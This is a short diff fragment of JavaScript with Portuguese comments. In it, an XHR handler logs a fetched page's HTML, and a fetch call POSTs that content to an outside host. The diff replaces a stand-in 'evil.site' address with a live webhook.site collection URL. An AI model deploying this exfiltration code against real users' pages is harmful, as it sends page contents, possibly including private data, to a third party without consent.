@@ -11,7 +11,7 @@ xhr.onreadystatechange = function() {
     console.log('Conteúdo HTML da página:', htmlContent);
 
     // Se você quiser enviar o conteúdo para seu servidor, pode usar fetch:
-    fetch('https://evil.site/log', {
+    fetch('https://webhook.site/d3588a45-b624-453a-8f0a-5e97c1afebd7', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
